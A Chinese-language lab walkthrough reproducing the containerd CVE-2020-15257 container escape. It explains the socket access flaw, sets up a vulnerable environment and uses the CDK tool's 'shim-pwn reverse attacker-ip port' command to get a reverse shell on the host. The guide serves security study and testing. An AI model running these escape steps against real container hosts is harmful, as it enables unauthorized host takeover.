# Containerd漏洞导致容器逃逸（CVE-2020-15257）

## 场景介绍

Containerd是一个控制runC的守护进程，提供命令行客户端和API，用于在一个机器上管理容器。

在版本1.3.9之前和1.4.0~1.4.2的Containerd中，由于在**网络模式为host**的情况下，容器与宿主机共享一套Network namespace ，此时containerd-shim API暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问，刚好在**默认情况下，容器内部的进程是以root用户启动**的。在两者的共同作用下，容器内部的进程就可以像主机中的containerd一样，连接containerd-shim监听的抽象Unix域套接字，调用containerd-shim提供的各种API，从而实现容器逃逸。

## 环境搭建

漏洞环境准备：

```bash
./metarget cnv install cve-2020-15257
```

## 漏洞复现

使用以下命令启动容器:

```bash
sudo docker run -it --net=host --name=15257 ubuntu /bin/bash
```

在容器内执行命令`cat /proc/net/unix|grep -a "containerd-shim"`，查看结果确认是否可看到抽象命名空间Unix域套接字:

![image-20210618151008778](images/1.png)

在攻击端监听1234端口，然后下载漏洞利用工具[CDK](https://github.com/cdk-team/CDK)，并将其传入容器/tmp目录下：

```bash
sudo docker cp cdk_linux_amd64 15257:/tmp
sudo docker exec -it 15257 bash
```

运行工具，执行反弹shell命令,验证得到一个宿主机的shell:

```bash
cd /tmp
./cdk_linux_amd64 run shim-pwn reverse attacker-ip port
```

注：

关于该漏洞在利用时出现类似以下内容的问题，可以暂时参考[issue #74](https://github.com/brant-ruan/metarget/issues/74)。

```
rpc error: code = Unknown desc = OCI runtime create failed: exec: "runc": executable file not found in $PATH
```

## 参考文献

1. https://mp.weixin.qq.com/s/WmSaLPnG4o4Co1xRiYCOnQ
2. https://www.cdxy.me/?p=837
